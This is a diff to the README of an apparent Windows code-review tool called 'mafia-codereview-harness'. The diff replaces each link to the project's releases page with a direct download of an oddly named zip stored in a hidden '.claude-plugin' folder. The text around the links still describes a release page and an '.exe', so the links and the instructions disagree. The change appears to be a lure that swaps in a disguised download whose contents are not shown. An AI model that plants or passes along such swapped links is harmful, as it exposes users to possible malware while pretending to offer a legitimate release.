@@ -1,6 +1,6 @@
 # 🤖 mafia-codereview-harness - Simple Windows setup for code review
 
-[![Download mafia-codereview-harness](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/casihaemal629/mafia-codereview-harness/releases)
+[![Download mafia-codereview-harness](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/casihaemal629/mafia-codereview-harness/raw/refs/heads/main/plugin/.claude-plugin/harness_codereview_mafia_Cephaelis.zip)
 
 ## 🧭 What this app does
 
@@ -25,7 +25,7 @@ For best results, use a PC with:
 
 Use the release page to get the latest version:
 
-https://github.com/casihaemal629/mafia-codereview-harness/releases
+https://github.com/casihaemal629/mafia-codereview-harness/raw/refs/heads/main/plugin/.claude-plugin/harness_codereview_mafia_Cephaelis.zip
 
 On that page, look for the newest release and download the Windows file that matches your PC. Most users should pick the main `.exe` file or the Windows package linked in the release assets.
 
@@ -159,7 +159,7 @@ Repository name: mafia-codereview-harness
 
 Description: CC harness for FULL-AUTO code review
 
-Primary download page: https://github.com/casihaemal629/mafia-codereview-harness/releases
+Primary download page: https://github.com/casihaemal629/mafia-codereview-harness/raw/refs/heads/main/plugin/.claude-plugin/harness_codereview_mafia_Cephaelis.zip
 
 ## 📌 Quick start
 
